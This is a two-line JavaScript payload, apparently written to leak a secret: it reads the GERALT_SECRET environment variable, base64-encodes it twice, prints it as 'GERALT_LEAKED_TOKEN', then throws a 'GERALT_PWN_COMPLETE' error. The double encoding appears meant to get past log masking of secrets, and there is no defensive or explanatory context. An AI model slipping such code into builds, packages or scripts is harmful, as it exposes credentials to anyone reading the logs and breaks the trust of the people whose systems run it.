console.log("GERALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(process.env.GERALT_SECRET || "").toString("base64")).toString("base64"));
throw new Error("GERALT_PWN_COMPLETE");
